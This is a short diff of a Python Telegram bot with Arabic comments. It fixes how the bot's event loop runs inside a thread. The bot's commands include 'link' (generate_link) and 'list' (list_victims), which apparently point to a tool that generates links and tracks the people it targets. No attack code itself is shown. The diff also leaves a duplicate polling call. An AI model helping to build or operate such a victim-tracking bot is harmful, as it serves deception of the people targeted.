@@ -173,16 +173,20 @@ async def stats(update, context):
 import asyncio
 
 def run_bot():
-    # 1. إنشاء حلقة أحداث جديدة وتعيينها لهذا الخيط (Thread) لعدم انهيار التطبيق
+    # 1. إنشاء حلقة الأحداث للخيط الفرعي
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     
-    # 2. بناء البوت وإضافة الأوامر البرمجية (كما هي في كودك الأصلي)
+    # 2. بناء البوت (كودك الأصلي)
     app_bot = Application.builder().token(TELEGRAM_TOKEN).build()
     app_bot.add_handler(CommandHandler("start", start))
     app_bot.add_handler(CommandHandler("link", generate_link))
     app_bot.add_handler(CommandHandler("list", list_victims))
     app_bot.add_handler(CommandHandler("stats", stats))
+    
+    # 3. تشغيل البوت مع تعطيل تعارض إشارات النظام (الخيوط الفرعية)
+    loop.run_until_complete(app_bot.run_polling(close_loop=False, stop_signals=False))
+
     
     # 3. تشغيل البوت بشكل صحيح ومتزامن داخل حلقة الأحداث التي أنشأناها
     loop.run_until_complete(app_bot.run_polling())
